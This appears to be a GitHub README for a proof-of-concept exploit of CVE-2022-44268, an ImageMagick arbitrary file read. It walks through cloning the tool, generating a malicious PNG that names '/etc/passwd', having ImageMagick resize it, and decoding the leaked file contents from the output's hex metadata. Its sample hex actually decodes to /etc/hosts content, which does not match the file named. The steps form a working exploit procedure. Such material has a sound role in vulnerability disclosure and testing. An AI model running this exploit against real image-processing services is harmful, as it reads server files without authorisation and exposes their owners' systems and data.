# CVE-2022-44268 Arbitrary File Read PoC - PNG generator
This is a proof of concept of the ImageMagick bug discovered by https://www.metabaseq.com/imagemagick-zero-days/

Tested on ImageMagick v. 7.1.0-48 and 6.9.11-60

## How to use

### Clone the project
`git clone https://github.com/voidz0r/CVE-2022-44268`

### Run the project
`cargo run "/etc/passwd"`

### Use the file with ImageMagick
`convert image.png -resize 50% output.png`

### Analyze the resized image 
`identify -verbose output.png`

### Convert hex to str
`python3 -c 'print(bytes.fromhex("23202f6574632f686f7374730a3132372e302e302e31096c6f63616c686f73740a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3109096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a3109096970362d616c6c6e6f6465730a666630323a3a3209096970362d616c6c726f75746572730a6475636e740a"))`

### Screens
![generating payload](/screens/01_generating.png)
![resizing image](/screens/02_resized_image.png)
![hex](/screens/03_hex.png)
![result](/screens/04_result.png)
